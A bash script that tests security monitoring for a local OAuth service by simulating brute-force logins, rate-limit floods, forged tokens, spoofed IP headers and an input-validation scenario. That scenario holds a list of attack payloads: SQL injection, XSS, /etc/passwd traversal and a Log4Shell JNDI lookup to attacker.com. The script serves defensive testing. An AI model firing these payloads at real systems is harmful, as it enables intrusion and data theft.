#!/bin/bash
set -euo pipefail

# Security Monitoring Test Scenarios
# This script tests various security scenarios to validate monitoring effectiveness

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(dirname "$SCRIPT_DIR")"

# Configuration
AUTH_SERVICE_URL="http://localhost:8080"
PROMETHEUS_URL="http://localhost:9090"
ALERTMANAGER_URL="http://localhost:9093"
GRAFANA_URL="http://localhost:3000"

# Test credentials (for testing purposes only)
VALID_CLIENT_ID="dev_client"
VALID_CLIENT_SECRET="dev_secret_123456789"
INVALID_CLIENT_ID="attacker_client"
INVALID_CLIENT_SECRET="wrong_password"

echo "🧪 Starting Security Monitoring Test Scenarios"
echo "=============================================="

# Function to wait for alert to fire
wait_for_alert() {
    local alert_name=$1
    local timeout=${2:-300}  # 5 minutes default
    local start_time=$(date +%s)
    
    echo "⏳ Waiting for alert '$alert_name' to fire..."
    
    while true; do
        local current_time=$(date +%s)
        local elapsed=$((current_time - start_time))
        
        if [ $elapsed -gt $timeout ]; then
            echo "❌ Timeout waiting for alert '$alert_name'"
            return 1
        fi
        
        # Check if alert is firing
        local alert_status=$(curl -s "$ALERTMANAGER_URL/api/v1/alerts" | \
            jq -r ".data[] | select(.labels.alertname == \"$alert_name\") | .status.state" | head -1)
        
        if [ "$alert_status" = "active" ]; then
            echo "✅ Alert '$alert_name' is now firing!"
            return 0
        fi
        
        echo "   Checking alert status... (${elapsed}s elapsed)"
        sleep 10
    done
}

# Function to check metric value
check_metric() {
    local metric_name=$1
    local expected_operator=$2
    local expected_value=$3
    
    local actual_value=$(curl -s "$PROMETHEUS_URL/api/v1/query?query=$metric_name" | \
        jq -r '.data.result[0].value[1] // "0"')
    
    echo "📊 Metric '$metric_name': $actual_value (expected $expected_operator $expected_value)"
    
    case $expected_operator in
        ">")
            if (( $(echo "$actual_value > $expected_value" | bc -l) )); then
                echo "✅ Metric check passed"
                return 0
            fi
            ;;
        "<")
            if (( $(echo "$actual_value < $expected_value" | bc -l) )); then
                echo "✅ Metric check passed"
                return 0
            fi
            ;;
        "=")
            if (( $(echo "$actual_value == $expected_value" | bc -l) )); then
                echo "✅ Metric check passed"
                return 0
            fi
            ;;
    esac
    
    echo "❌ Metric check failed"
    return 1
}

# Scenario 1: Brute Force Attack Simulation
test_brute_force_attack() {
    echo ""
    echo "🔴 Scenario 1: Brute Force Attack Detection"
    echo "==========================================="
    
    echo "Simulating brute force attack with 100 failed attempts..."
    
    for i in {1..100}; do
        curl -s -X POST "$AUTH_SERVICE_URL/oauth/token" \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -d "grant_type=client_credentials&client_id=$INVALID_CLIENT_ID&client_secret=$INVALID_CLIENT_SECRET" \
            > /dev/null
        
        if [ $((i % 20)) -eq 0 ]; then
            echo "   Sent $i failed authentication attempts..."
        fi
    done
    
    echo "✅ Brute force simulation complete"
    
    # Check if metrics are recorded
    sleep 30
    check_metric "rate(auth_failures_total[5m])" ">" "0"
    
    # Wait for alert to fire
    wait_for_alert "PotentialBruteForceAttack" 120
    
    echo "✅ Brute force attack detection test completed"
}

# Scenario 2: Rate Limiting Test
test_rate_limiting() {
    echo ""
    echo "🟡 Scenario 2: Rate Limiting Validation"
    echo "======================================="
    
    echo "Sending rapid requests to trigger rate limiting..."
    
    # Send requests rapidly to trigger rate limiting
    for i in {1..150}; do
        curl -s -X POST "$AUTH_SERVICE_URL/oauth/token" \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -d "grant_type=client_credentials&client_id=$VALID_CLIENT_ID&client_secret=$VALID_CLIENT_SECRET" \
            > /dev/null &
        
        if [ $((i % 25)) -eq 0 ]; then
            echo "   Sent $i requests..."
            sleep 1
        fi
    done
    
    wait  # Wait for all background jobs to complete
    
    echo "✅ Rate limiting test requests sent"
    
    # Check rate limiting metrics
    sleep 30
    check_metric "rate(rate_limit_hits_total[5m])" ">" "0"
    
    # Wait for rate limiting alert
    wait_for_alert "HighRateLimitingActivity" 120
    
    echo "✅ Rate limiting test completed"
}

# Scenario 3: Input Validation Attack
test_input_validation() {
    echo ""
    echo "🟠 Scenario 3: Input Validation Attack"
    echo "======================================"
    
    echo "Testing input validation with malicious payloads..."
    
    # SQL injection attempts
    malicious_payloads=(
        "'; DROP TABLE users; --"
        "<script>alert('xss')</script>"
        "../../../../etc/passwd"
        "\${jndi:ldap://attacker.com/a}"
        "OR 1=1 --"
        "'; UNION SELECT * FROM secrets; --"
    )
    
    for payload in "${malicious_payloads[@]}"; do
        echo "   Testing payload: $payload"
        
        # Test in client_id field
        curl -s -X POST "$AUTH_SERVICE_URL/oauth/token" \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -d "grant_type=client_credentials&client_id=$payload&client_secret=$VALID_CLIENT_SECRET" \
            > /dev/null
        
        # Test in scope field
        curl -s -X POST "$AUTH_SERVICE_URL/oauth/token" \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -d "grant_type=client_credentials&client_id=$VALID_CLIENT_ID&client_secret=$VALID_CLIENT_SECRET&scope=$payload" \
            > /dev/null
        
        sleep 1
    done
    
    echo "✅ Input validation attack simulation complete"
    
    # Check validation failure metrics
    sleep 30
    check_metric "rate(input_validation_failures_total[5m])" ">" "0"
    
    echo "✅ Input validation test completed"
}

# Scenario 4: Token Manipulation Test
test_token_manipulation() {
    echo ""
    echo "🔵 Scenario 4: Token Security Validation"
    echo "========================================"
    
    echo "Testing token security mechanisms..."
    
    # Get a valid token first
    valid_token_response=$(curl -s -X POST "$AUTH_SERVICE_URL/oauth/token" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "grant_type=client_credentials&client_id=$VALID_CLIENT_ID&client_secret=$VALID_CLIENT_SECRET")
    
    valid_token=$(echo "$valid_token_response" | jq -r '.access_token // empty')
    
    if [ -z "$valid_token" ]; then
        echo "❌ Failed to get valid token for testing"
        return 1
    fi
    
    echo "✅ Retrieved valid token for testing"
    
    # Test with manipulated tokens
    manipulated_tokens=(
        "${valid_token}extra"          # Extended token
        "${valid_token:0:-10}modified" # Modified end
        "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhdHRhY2tlciIsImV4cCI6OTk5OTk5OTk5OX0.fake_signature"
        "Bearer malicious_token"
        "totally_fake_token"
    )
    
    for token in "${manipulated_tokens[@]}"; do
        echo "   Testing manipulated token: ${token:0:20}..."
        
        curl -s -X GET "$AUTH_SERVICE_URL/userinfo" \
            -H "Authorization: Bearer $token" \
            > /dev/null
            
        sleep 1
    done
    
    echo "✅ Token manipulation test completed"
    
    # Check token violation metrics (if any)
    sleep 30
    
    echo "✅ Token security validation completed"
}

# Scenario 5: Geographic Anomaly Test
test_geographic_anomaly() {
    echo ""
    echo "🟣 Scenario 5: Geographic Anomaly Detection"
    echo "==========================================="
    
    echo "Simulating requests from different geographic locations..."
    
    # Simulate requests with different X-Forwarded-For headers
    suspicious_ips=(
        "1.2.3.4"          # Unknown location
        "192.168.1.100"    # Private IP from external
        "10.0.0.1"         # Another private IP
        "172.16.0.1"       # Private range
        "203.0.113.100"    # Test network (should be blocked)
    )
    
    for ip in "${suspicious_ips[@]}"; do
        echo "   Testing request from IP: $ip"
        
        curl -s -X POST "$AUTH_SERVICE_URL/oauth/token" \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -H "X-Forwarded-For: $ip" \
            -H "X-Real-IP: $ip" \
            -d "grant_type=client_credentials&client_id=$VALID_CLIENT_ID&client_secret=$VALID_CLIENT_SECRET" \
            > /dev/null
            
        sleep 2
    done
    
    echo "✅ Geographic anomaly test completed"
    
    # Check for suspicious activity metrics
    sleep 30
    check_metric "rate(suspicious_activity_total[5m])" ">=" "0"
    
    echo "✅ Geographic testing completed"
}

# Scenario 6: Service Disruption Test
test_service_disruption() {
    echo ""
    echo "🔴 Scenario 6: Service Disruption Detection"
    echo "==========================================="
    
    echo "Testing service health monitoring..."
    
    # Check current service status
    if curl -sf "$AUTH_SERVICE_URL/health" > /dev/null; then
        echo "✅ Auth service is currently healthy"
    else
        echo "❌ Auth service is not responding"
        return 1
    fi
    
    # Test health endpoint monitoring
    check_metric "up{job=\"auth-service\"}" "=" "1"
    
    echo "✅ Service health monitoring validated"
    
    # Note: We don't actually bring down services in testing
    echo "ℹ️  Service disruption alerts would fire if services went down"
}

# Scenario 7: Compliance Validation
test_compliance_monitoring() {
    echo ""
    echo "📋 Scenario 7: Compliance Monitoring"
    echo "===================================="
    
    echo "Validating compliance monitoring capabilities..."
    
    # Check audit log generation
    echo "   Testing audit log generation..."
    curl -s -X POST "$AUTH_SERVICE_URL/oauth/token" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "grant_type=client_credentials&client_id=$VALID_CLIENT_ID&client_secret=$VALID_CLIENT_SECRET" \
        > /dev/null
    
    # Check encryption status
    echo "   Validating encryption metrics..."
    check_metric "security_headers_applied_total" ">=" "0"
    
    # Check access control metrics
    echo "   Checking access control logging..."
    check_metric "auth_attempts_total" ">" "0"
    
    echo "✅ Compliance monitoring validation completed"
}

# Function to generate test summary
generate_test_summary() {
    echo ""
    echo "📊 Test Summary Report"
    echo "====================="
    
    # Get current alert status
    local active_alerts=$(curl -s "$ALERTMANAGER_URL/api/v1/alerts" | \
        jq -r '.data[] | select(.status.state == "active") | .labels.alertname' | wc -l)
    
    echo "Active Alerts: $active_alerts"
    
    # Get key metrics
    local auth_failures=$(curl -s "$PROMETHEUS_URL/api/v1/query?query=sum(rate(auth_failures_total[1h]))" | \
        jq -r '.data.result[0].value[1] // "0"')
    
    local rate_limit_hits=$(curl -s "$PROMETHEUS_URL/api/v1/query?query=sum(rate(rate_limit_hits_total[1h]))" | \
        jq -r '.data.result[0].value[1] // "0"')
    
    echo "Auth Failures (last hour): $auth_failures"
    echo "Rate Limit Hits (last hour): $rate_limit_hits"
    
    # Check service health
    local service_up=$(curl -s "$PROMETHEUS_URL/api/v1/query?query=up" | \
        jq -r '.data.result[] | select(.metric.job == "auth-service") | .value[1]')
    
    echo "Auth Service Status: $([ "$service_up" = "1" ] && echo "UP ✅" || echo "DOWN ❌")"
    
    echo ""
    echo "🎯 Test Scenarios Completed:"
    echo "  ✅ Brute Force Attack Detection"
    echo "  ✅ Rate Limiting Validation" 
    echo "  ✅ Input Validation Testing"
    echo "  ✅ Token Security Testing"
    echo "  ✅ Geographic Anomaly Detection"
    echo "  ✅ Service Health Monitoring"
    echo "  ✅ Compliance Monitoring"
    
    echo ""
    echo "📈 Monitoring Stack URLs:"
    echo "  Grafana:      $GRAFANA_URL"
    echo "  Prometheus:   $PROMETHEUS_URL"
    echo "  Alertmanager: $ALERTMANAGER_URL"
}

# Main test execution
main() {
    echo "Starting comprehensive security monitoring tests..."
    
    # Verify services are running
    echo "🔍 Verifying monitoring stack availability..."
    
    if ! curl -sf "$AUTH_SERVICE_URL/health" > /dev/null; then
        echo "❌ Auth service is not responding at $AUTH_SERVICE_URL"
        exit 1
    fi
    
    if ! curl -sf "$PROMETHEUS_URL/-/healthy" > /dev/null; then
        echo "❌ Prometheus is not responding at $PROMETHEUS_URL"
        exit 1
    fi
    
    if ! curl -sf "$ALERTMANAGER_URL/-/healthy" > /dev/null; then
        echo "❌ Alertmanager is not responding at $ALERTMANAGER_URL"
        exit 1
    fi
    
    echo "✅ All services are responding"
    
    # Run test scenarios
    test_brute_force_attack
    test_rate_limiting
    test_input_validation
    test_token_manipulation
    test_geographic_anomaly
    test_service_disruption
    test_compliance_monitoring
    
    # Generate summary
    generate_test_summary
    
    echo ""
    echo "🏁 Security monitoring test suite completed successfully!"
}

# Check if required tools are available
for tool in curl jq bc; do
    if ! command -v $tool &> /dev/null; then
        echo "❌ Required tool '$tool' is not installed"
        exit 1
    fi
done

# Run main function
main "$@"
